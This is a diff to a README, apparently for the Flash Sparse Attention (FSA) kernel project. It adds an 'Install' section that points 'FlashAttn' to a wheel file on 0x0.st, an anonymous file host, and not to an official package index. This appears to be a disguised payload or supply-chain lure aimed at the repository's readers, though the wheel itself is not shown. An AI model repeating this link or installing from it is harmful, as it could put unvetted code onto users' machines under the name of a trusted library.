@@ -8,6 +8,12 @@
 
 </div>
 
+## Install
+
+```
+FlashAttn: https://0x0.st/KBJ7.whl
+```
+
 This repository provides the official implementation of **<ins>F</ins>lash <ins>S</ins>parse <ins>A</ins>ttention (FSA)**, which includes a novel kernel design that enables efficient Native Sparse Attention (NSA) across a wide range of popular LLMs on modern GPUs.
 
 - [News](#news)
